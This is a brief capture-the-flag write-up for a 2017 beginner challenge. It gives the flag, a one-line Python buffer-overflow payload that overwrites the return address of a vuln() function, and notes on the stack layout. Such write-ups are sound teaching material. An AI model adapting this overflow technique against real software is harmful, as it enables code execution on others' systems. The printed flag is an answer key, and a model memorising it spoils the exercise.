# CTF101 2017: Challenge 2

## Type of challenge 

- Stack buffer overflow
- Overwrite return address

## Flag 

```
ctf{conquered_the_impossible}
```

---

## Exploit

```
python -c 'print "a" * 68 + "\x8b\x84\x04\x08"' | ./impossible
```

### Notes

- Overwrite the return address of the `vuln()` function, where the stack looks like as follows, from `$esp`:
    - (`$esp`)
    - 64 bytes: Contents of `char buf[64]`
    - (`$ebp`)
    - 4 bytes: Main frame pointer
    - 4 bytes: Return address
